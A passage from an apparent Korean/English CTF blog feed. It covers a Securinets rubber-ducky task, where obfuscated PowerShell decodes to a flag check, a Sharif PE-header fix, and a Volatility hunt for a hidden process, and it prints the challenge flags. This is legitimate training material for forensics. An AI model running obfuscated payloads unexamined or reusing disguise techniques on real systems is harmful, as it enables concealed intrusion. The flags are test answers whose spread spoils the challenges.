class=&quot;nv&quot;&gt;${&quot;}${+}${=}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${&amp;amp;}${)}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${[}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${(}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${[}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${)}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${(}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${|}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${)}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${=}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${)}${[}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}${&amp;amp;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${.}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${|}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${]}${|}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${.}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${&amp;amp;}${)}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${[}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${(}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${[}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${)}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${+}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${+}${(}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${[}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${(}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${@}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${&amp;amp;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${|}${)}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}${.}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${.}${[}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${.}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${=}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;${&quot;}${+}${@}${]}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Unpacking is simple. Just run it in powershell as it’s written in payload.
+&lt;img src=&quot;/assets/images/2018-03-26-Securinets-CTF-duck-hunt-300/run.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] powershell run&lt;/p&gt;
+
+&lt;p&gt;If “[CHar]” type values are output, the user can get the input value and check the comparison code. Within that code we can get the flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-03-26-Securinets-CTF-duck-hunt-300/type.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] result of run&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Read-Host-Prompt &lt;span class=&quot;s1&quot;&gt;'Enter the password'&lt;/span&gt;
+If &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;flag &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Flag{is_a_rubber_ducky_used_somewhere!}'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-03-26-Securinets-CTF-duck-hunt-300/flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] flag&lt;/p&gt;
+
+&lt;p align=&quot;right&quot;&gt;&lt;strong&gt;Flag{is_a_rubber_ducky_used_somewhere!}&lt;/strong&gt;&lt;/p&gt;</content><author><name>suheyon.Jin</name></author><category term="[&quot;CTF&quot;]" /><category term="2018_Securinets" /><category term="Forensic" /><category term="Writeup" /><category term="ducky" /><summary type="html">Exercise</summary></entry><entry><title type="html">[2018_Sharif_CTF] RunMe(50)</title><link href="http://localhost:4000/ctf/Sharif-CTF-RunMe-50/" rel="alternate" type="text/html" title="[2018_Sharif_CTF] RunMe(50)" /><published>2018-02-16T00:00:00+09:00</published><updated>2018-02-16T00:00:00+09:00</updated><id>http://localhost:4000/ctf/Sharif-CTF-RunMe-50</id><content type="html" xml:base="http://localhost:4000/ctf/Sharif-CTF-RunMe-50/">&lt;h2 id=&quot;exercise&quot;&gt;Exercise&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Run the attached file. If you can, you will capture the flag.&lt;br /&gt;
+Note: Apply the minimum changes to make the file executable. Then, the mentioned hash function is md5. Be sure to run it on a real Windows OS (not Wine, etc.)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-16-Sharif-CTF-RunMe-50/exercise.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] exercise&lt;/p&gt;
+
+&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
+
+&lt;p&gt;binary를 정상적으로 실행시키는 것이 전부인 문제. PE 파일임을 알 수 있다. real Windows OS 에서 실행해야 한다고 명시되어 있지만, 가상 환경에서 문제 없이 돌아간다.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ✘ jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Reversing/50_Run me
+exiftool ./RunMe2.exe
+ExifTool Version Number         : 10.55
+File Name                       : RunMe2.exe
+Directory                       : &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+File Size                       : 70 kB
+File Modification Date/Time     : 2018:02:11 19:13:17+09:00
+File Access Date/Time           : 2018:02:16 15:36:30+09:00
+File Inode Change Date/Time     : 2018:02:11 19:13:17+09:00
+File Permissions                : rw-r--r--
+File Type                       : Win32 EXE
+File Type Extension             : exe
+MIME Type                       : application/octet-stream
+Machine Type                    : Intel 386 or later, and compatibles
+Time Stamp                      : 2018:01:30 13:22:02+09:00
+PE Type                         : PE32
+Linker Version                  : 14.0
+Code Size                       : 41984
+Initialized Data Size           : 31744
+Uninitialized Data Size         : 0
+Entry Point                     : 0x1250
+OS Version                      : 5.1
+Image Version                   : 0.0
+Subsystem Version               : 5.1
+Subsystem                       : Native
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;실행을 해보면, 정상적으로 동작하지 않는 것을 확인할 수 있다. 정상적인 PE binary와 비교했을 때, 차이점을 살펴보다. &lt;code class=&quot;highlighter-rouge&quot;&gt;Subsystem&lt;/code&gt; 항목이 Native 로 설정되어 있는 것을 확인할 수 있었는데 관련 정보를 찾아보니 보통, &lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;3&lt;/code&gt; 으로 지정되어 있는 것을 확인.
+&lt;img src=&quot;/assets/images/2018-02-16-Sharif-CTF-RunMe-50/error.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] execution error&lt;/i&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;NATIVE : 1  --&amp;gt;  Doesn't require a subsystem
+Windows GUI : 2 --&amp;gt; Runs in the Windows GUI subsystem
+WINDOWS CUI : 3 --&amp;gt; Runs in console subsystem
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;아래와 같이, &lt;code class=&quot;highlighter-rouge&quot;&gt;Subsystem&lt;/code&gt; offset을 수정해주었다. 그 결과, 실행에 성공했다는 string 과 함께, file의 hash 값이 flag임을 명시하고 있다.
+&lt;img src=&quot;/assets/images/2018-02-16-Sharif-CTF-RunMe-50/fix.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] fix subsystem&lt;/i&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\Users\jsh05042\Desktop\sharif\reversing&amp;gt;python
+Python 2.7.6 (default, Nov 10 2013, 19:24:18) [MSC v.1500 32 bit (Intel)] on win32
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&amp;gt;&amp;gt;&amp;gt; import hashlib
+&amp;gt;&amp;gt;&amp;gt; f = open('RunMe2.exe','rb')
+&amp;gt;&amp;gt;&amp;gt; hashlib.md5(f.read()).hexdigest()
+'3de0531cb6069ff18543fe767e384b83'
+&amp;gt;&amp;gt;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p align=&quot;right&quot;&gt;&lt;strong&gt;SharifCTF{3de0531cb6069ff18543fe767e384b83}&lt;/strong&gt;&lt;/p&gt;</content><author><name>suheyon.Jin</name></author><category term="[&quot;CTF&quot;]" /><category term="2018_Sharif" /><category term="Reversing" /><category term="Writeup" /><category term="string" /><summary type="html">Exercise</summary></entry><entry><title type="html">[2018_Sharif_CTF] Hidden(100)</title><link href="http://localhost:4000/ctf/Sharif-CTF-Hidden-100/" rel="alternate" type="text/html" title="[2018_Sharif_CTF] Hidden(100)" /><published>2018-02-16T00:00:00+09:00</published><updated>2018-02-16T00:00:00+09:00</updated><id>http://localhost:4000/ctf/Sharif-CTF-Hidden-100</id><content type="html" xml:base="http://localhost:4000/ctf/Sharif-CTF-Hidden-100/">&lt;h2 id=&quot;exercise&quot;&gt;Exercise&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Find the hidden process.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The flag is SharifCTF{MD5(Process id)}.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-16-Sharif-CTF-Hidden-100/exercise.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] exercise&lt;/p&gt;
+
+&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
+
+&lt;p&gt;숨겨진 프로세스를 찾아내는 문제. &lt;code class=&quot;highlighter-rouge&quot;&gt;process&lt;/code&gt; -&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Memory?&lt;/code&gt; 직감에 압축을 풀고, binary를 살펴보면, memory dump 파일임을 알 수 있다. volatility를 이용해 imageinfo 결과 xp memory dump 파일임을 확인.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/100_ Hidden
+vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./dump imageinfo
+Volatility Foundation Volatility Framework 2.6
+INFO    : volatility.debug    : Determining profile based on KDBG search...
+WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;vtypes
+WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;vtypes
+WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;vtypes
+          Suggested Profile&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : WinXPSP2x86, WinXPSP3x86 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Instantiated with WinXPSP2x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                     AS Layer1 : IA32PagedMemoryPae &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Kernel AS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                     AS Layer2 : FileAddressSpace &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/Users/Mac/Desktop/CTF/2018_Sharif_CTF/Forensic/100_ Hidden/dump&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                      PAE &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; : PAE
+                           DTB : 0x359000L
+                          KDBG : 0x80545c60L
+          Number of Processors : 1
+     Image Type &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Service Pack&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 3
+                KPCR &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;CPU 0 : 0xffdff000L
+             KUSER_SHARED_DATA : 0xffdf0000L
+           Image &lt;span class=&quot;nb&quot;&gt;date &lt;/span&gt;and &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt; : 2018-01-28 17:35:20 UTC+0000
+     Image &lt;span class=&quot;nb&quot;&gt;local date &lt;/span&gt;and &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt; : 2018-01-28 21:05:20 +0330
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;process 확인을 위해서, &lt;code class=&quot;highlighter-rouge&quot;&gt;pslist&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;psscan&lt;/code&gt; 두 명령어를 수행하고, psscan 에서 추가적으로 식별되는 항목을 확인할 수 있다.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/100_ Hidden
+ vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./dump &lt;span class=&quot;nv&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;WinXPSP2x86 pslist
+Volatility Foundation Volatility Framework 2.6
+Offset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;V&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit
+&lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------------------------------&lt;/span&gt;
+0x81242a00 System                    4      0     57      263 &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;      0
+0xff391900 smss.exe                548      4      3       19 &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;      0 2018-01-28 16:59:16 UTC+0000
+0xff36bda0 csrss.exe               620    548     12      305      0      0 2018-01-28 16:59:19 UTC+0000
+0xff39f608 winlogon.exe            644    548     19      537      0      0 2018-01-28 16:59:20 UTC+0000
+0xff391488 services.exe            688    644     16      353      0      0 2018-01-28 16:59:24 UTC+0000
+0xff390410 lsass.exe               700    644     20      349      0      0 2018-01-28 16:59:25 UTC+0000
+0xff378798 vmacthlp.exe            856    688      1       25      0      0 2018-01-28 16:59:34 UTC+0000
+0xff3a59c0 svchost.exe             900    688     17      211      0      0 2018-01-28 16:59:39 UTC+0000
+0xff3bc378 svchost.exe             988    688     11      235      0      0 2018-01-28 16:59:47 UTC+0000
+0xff3cb6e0 svchost.exe            1024    688     54     1107      0      0 2018-01-28 16:59:51 UTC+0000
+0xff2077a8 svchost.exe            1188    688      4       57      0      0 2018-01-28 16:59:53 UTC+0000
+0xff3a7878 svchost.exe            1236    688     10      167      0      0 2018-01-28 16:59:56 UTC+0000
+0xff1bbcf0 spoolsv.exe            1508    688     11      140      0      0 2018-01-28 17:00:19 UTC+0000
+0xff1b1020 explorer.exe           1576   1444     12      404      0      0 2018-01-28 17:00:24 UTC+0000
+0xff1aa9f0 svchost.exe            1604    688      4      105      0      0 2018-01-28 17:00:25 UTC+0000
+0xff197b20 svchost.exe            1692    688      3       94      0      0 2018-01-28 17:00:31 UTC+0000
+0x811244c0 rundll32.exe            396   1576      4       70      0      0 2018-01-28 17:02:48 UTC+0000
+0xff1c30e8 wscntfy.exe             920   1024      1       31      0      0 2018-01-28 17:05:09 UTC+0000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/100_ Hidden
+ vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./dump &lt;span class=&quot;nv&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;WinXPSP2x86 psscan
+Volatility Foundation Volatility Framework 2.6
+Offset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;P&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;          Name                PID   PPID PDB        Time created                   Time exited
+&lt;span class=&quot;nt&quot;&gt;------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------------------------------&lt;/span&gt;
+0x000000000096c0e8 wscntfy.exe         920   1024 0x007002c0 2018-01-28 17:05:09 UTC+0000
+0x00000000010eb4c0 rundll32.exe        396   1576 0x007001a0 2018-01-28 17:02:48 UTC+0000
+0x0000000001209a00 System                4      0 0x00359000
+0x0000000001bbd488 services.exe        688    644 0x00700080 2018-01-28 16:59:24 UTC+0000
+0x0000000001bbd900 smss.exe            548      4 0x00700020 2018-01-28 16:59:16 UTC+0000
+0x0000000001c279c0 svchost.exe         900    688 0x00700100 2018-01-28 16:59:39 UTC+0000
+0x0000000001c58798 vmacthlp.exe        856    688 0x007000c0 2018-01-28 16:59:34 UTC+0000
+0x0000000001de4878 svchost.exe        1236    688 0x00700180 2018-01-28 16:59:56 UTC+0000
+0x0000000001e64350 vmtoolsd.exe        404   1576 0x00700260 2018-01-28 17:02:50 UTC+0000
+0x0000000001e6d608 winlogon.exe        644    548 0x00700060 2018-01-28 16:59:20 UTC+0000
+0x0000000001ebe168 cmd.exe            1704   1576 0x007002a0 2018-01-28 17:30:47 UTC+0000   2018-01-28 17:34:00 UTC+0000
+0x0000000001ecd378 svchost.exe         988    688 0x00700120 2018-01-28 16:59:47 UTC+0000
+0x0000000001fbd6e0 svchost.exe        1024    688 0x00700140 2018-01-28 16:59:51 UTC+0000
+0x0000000001fbe410 lsass.exe           700    644 0x007000a0 2018-01-28 16:59:25 UTC+0000
+0x00000000021a7da0 csrss.exe           620    548 0x00700040 2018-01-28 16:59:19 UTC+0000
+0x00000000025b7020 explorer.exe       1576   1444 0x007001e0 2018-01-28 17:00:24 UTC+0000
+0x0000000002dbb448 wmiprvse.exe        908    900 0x00700240 2018-01-28 17:32:51 UTC+0000   2018-01-28 17:34:22 UTC+0000
+0x0000000002e7eb20 svchost.exe        1692    688 0x00700220 2018-01-28 17:00:31 UTC+0000
+0x000000000308d9f0 svchost.exe        1604    688 0x00700200 2018-01-28 17:00:25 UTC+0000
+0x00000000031b1cf0 spoolsv.exe        1508    688 0x007001c0 2018-01-28 17:00:19 UTC+0000
+0x00000000039347a8 svchost.exe        1188    688 0x00700160 2018-01-28 16:59:53 UTC+0000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;두 결과의 차이점 항목을 확인해보면, 아래와 같이 3개의 항목을 식별할 수 있다. &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd.exe&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;wmiprvse.exe&lt;/code&gt; 두 항목은 process 가 종료되어 pslist에서 식별되지 않았음을 알 수 있지만 &lt;code class=&quot;highlighter-rouge&quot;&gt;vmtoolsd.exe&lt;/code&gt; 항목은 종료된 기록이 없음과 동시에 pslist에서 식별되지 않았으므로 해당 항목이 은닉된 프로세스임을 알 수 있다. (자세히 보면, vmtools와 유사한 &lt;code class=&quot;highlighter-rouge&quot;&gt;vmtoolsd&lt;/code&gt; 파일명을 사용하고 있다.)&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x0000000001ebe168 cmd.exe            1704   1576 0x007002a0 2018-01-28 17:30:47 UTC+0000   2018-01-28 17:34:00 UTC+0000
+0x0000000002dbb448 wmiprvse.exe        908    900 0x00700240 2018-01-28 17:32:51 UTC+0000   2018-01-28 17:34:22 UTC+0000
+0x0000000001e64350 vmtoolsd.exe        404   1576 0x00700260 2018-01-28 17:02:50 UTC+0000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;md5 값이 flag 이므로 변환해주도록 한다.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;jsh05042&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Macs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MacBook&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Pro&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CTF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2018&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_Sharif_CTF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Forensic&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Hidden&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt;
